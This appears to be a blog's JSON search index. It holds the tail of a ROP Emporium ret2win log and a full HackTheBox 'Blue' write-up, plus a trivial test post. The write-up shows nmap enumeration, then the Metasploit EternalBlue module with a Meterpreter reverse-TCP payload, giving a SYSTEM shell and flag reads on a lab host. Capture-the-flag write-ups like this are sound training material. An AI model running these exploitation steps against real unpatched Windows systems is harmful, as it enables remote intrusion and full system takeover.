00000020 41 41 41 41 41 41 41 41 5a 07 40 00 00 00 00 00 │AAAA│AAAA│Z·@·│····│ 00000030 0a │·│ 00000031[*] Switching to interactive mode[DEBUG] Received 0x28 bytes: b'Thank you!\\n' b\"Well done! Here's your flag:\\n\"Thank you!Well done! Here's your flag:[DEBUG] Received 0x21 bytes: b'ROPE{a_placeholder_32byte_flag!}\\n'ROPE{a_placeholder_32byte_flag!}[*] Process '/home/kali/ropemporium/ret2win/ret2win' stopped with exit code 0 (pid 1426237)[*] Got EOF while reading in interactive" }, { "title": "HTB Blue - writeup", "url": "/posts/htb-blue-writeup/", "categories": "Writeup, HTB", "tags": "htb, writeup, blue, eternal_blue, metasploit", "date": "2022-06-30 21:13:33 +0000", "snippet": "Blue machine is probably one of the easiest Windows machines on HackTheBox. Potential vulnerability is already hidden in machine name ;). But first thing first, let’s do an enumeration with nmap:$ ...", "content": "Blue machine is probably one of the easiest Windows machines on HackTheBox. Potential vulnerability is already hidden in machine name ;). But first thing first, let’s do an enumeration with nmap:$ sudo nmap -sS -sV -sC -Pn -O -A -p1-20000 -T5 10.10.10.40[sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-06 09:12 ESTWarning: 10.10.10.40 giving up on port because retransmission cap hit (2).Nmap scan report for 10.10.10.40Host is up (0.11s latency).Not shown: 19997 closed tcp ports (reset)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 8.1 (96%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2022-03-06T14:20:12|_ start_date: 2022-03-06T14:17:13| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.1: |_ Message signing enabled but not required| smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)| OS CPE: cpe:/o:microsoft:windows_7::sp1:professional| Computer name: haris-PC| NetBIOS computer name: HARIS-PC\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2022-03-06T14:20:13+00:00|_clock-skew: mean: 5m32s, deviation: 1s, median: 5m31sTRACEROUTE (using port 21/tcp)HOP RTT ADDRESS1 94.69 ms 10.10.16.12 46.14 ms 10.10.10.40OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 153.82 secondsWhen nmap finishes port scanning we see that Blue is running Windows 7 SP1 system. As we could find from the machine name there is a possibility, that it’s vulnerable to NSA EternalBlue exploit, let’s start metasploit and check it:$ msfconsole -qmsf6 &gt; search eternalMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 2 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 3 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 4 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code ExecutionInteract with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rceIn metasploit we have exploit/windows/smb/ms17_010_eternalblue exploit ready, so let’s use it:msf6 &gt; use 0[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcpand check what options are available:msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; optionsModule options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 445 yes The target port (TCP) SMBDomain no (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines. SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 192.168.17.132 yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Automatic TargetAbove options are default ones, so we need to change it:msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost tun0lhost =&gt; tun0msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.10.40rhosts =&gt; 10.10.10.40We will use tun0 interface for lhost, so metasploit will automatically pick proper IP address for us, also we need to set a target IP address (rhosts variable), and we’re ready to go.Lets run the exploit:msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run[-] Handler failed to bind to 10.10.16.3:4444:- -[-] Handler failed to bind to 0.0.0.0:4444:- -[-] 10.10.10.40:445 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).[*] Exploit completed, but no session was created.msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run[*] Started reverse TCP handler on 10.10.16.3:4444 [*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check[+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)[*] 10.10.10.40:445 - Scanned 1 of 1 hosts (100% complete)[+] 10.10.10.40:445 - The target is vulnerable.[*] 10.10.10.40:445 - Connecting to target for exploitation.[+] 10.10.10.40:445 - Connection established for exploitation.[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)[*] 10.10.10.40:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes[*] 10.10.10.40:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv[*] 10.10.10.40:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet[*] 10.10.10.40:445 - Starting non-paged pool grooming[+] 10.10.10.40:445 - Sending SMBv2 buffers[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.[*] 10.10.10.40:445 - Sending final SMBv2 buffers.[*] 10.10.10.40:445 - Sending last fragment of exploit packet![*] 10.10.10.40:445 - Receiving response from exploit packet[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)![*] 10.10.10.40:445 - Sending egg to corrupted connection.[*] 10.10.10.40:445 - Triggering free of corrupted buffer.[*] Sending stage (200262 bytes) to 10.10.10.40[*] Meterpreter session 1 opened (10.10.16.3:4444 -&gt; 10.10.10.40:49158 ) at 2022-03-06 11:09:44 -0500[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=Bingo! We’ve got the meterpreter session! Let’s check what is there:meterpreter &gt; psProcess List============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x64 0 132 644 WmiPrvSE.exe 272 4 smss.exe x64 0 NT AUTHORITY\\SYSTEM \\SystemRoot\\System32\\smss.exe 356 348 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\csrss.exe 408 348 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\wininit.exe 428 400 csrss.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\csrss.exe 484 400 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\winlogon.exe 516 408 services.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\services.exe 532 408 lsass.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\lsass.exe 544 408 lsm.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\lsm.exe 588 516 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 644 516 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 720 516 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 796 484 LogonUI.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\LogonUI.exe 804 516 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 872 516 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 912 516 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 948 516 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 1072 516 spoolsv.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\spoolsv.exe 1104 516 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 1200 516 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 1364 516 VGAuthService.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe 1404 516 vmtoolsd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe 1704 516 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 1908 516 dllhost.exe x64 0 NT AUTHORITY\\SYSTEM 1992 516 msdtc.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 2644 516 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 2716 516 SearchIndexer.exe x64 0 NT AUTHORITY\\SYSTEMOK, we see that there are some processes running, let’s spawn a shell and check our user:meterpreter &gt; shellProcess 2600 created.Channel 1 created.Microsoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamiwhoamint authority\\systemThat’s great, we have system privileges. Let’s get some flags, at first user one:C:\\Windows\\system32&gt;cd c:\\userscd c:\\usersc:\\Users&gt;dirdir Volume in drive C has no label. Volume Serial Number is BE92-053B Directory of c:\\Users21/07/2017 06:56 &lt;DIR&gt; .21/07/2017 06:56 &lt;DIR&gt; ..21/07/2017 06:56 &lt;DIR&gt; Administrator14/07/2017 13:45 &lt;DIR&gt; haris12/04/2011 07:51 &lt;DIR&gt; Public 0 File(s) 0 bytes 5 Dir(s) 2,495,332,352 bytes freec:\\Users&gt;cd hariscd harisc:\\Users\\haris&gt;cd desktopcd desktopc:\\Users\\haris\\Desktop&gt;dirdir Volume in drive C has no label. Volume Serial Number is BE92-053B Directory of c:\\Users\\haris\\Desktop24/12/2017 02:23 &lt;DIR&gt; .24/12/2017 02:23 &lt;DIR&gt; ..06/03/2022 14:17 34 user.txt 1 File(s) 34 bytes 2 Dir(s) 2,495,332,352 bytes freec:\\Users\\haris\\Desktop&gt;type user.txttype user.txt[flag redacted]And then Administrator flag:c:\\Users\\haris\\Desktop&gt;cd ..\\..\\Administrator\\Desktopcd ..\\..\\Administrator\\Desktopc:\\Users\\Administrator\\Desktop&gt;type root.txttype root.txt[flag redacted]Getting the real flags is an exercise for the reader, you have all needed steps above ;)" }, { "title": "Testing testing...", "url": "/posts/testing-testing/", "categories": "", "tags": "", "date": "2022-04-22 13:58:33 +0000", "snippet": "Hello WorldFirst post from the new blog! :smile:", "content": "Hello WorldFirst post from the new blog! :smile:" } ]
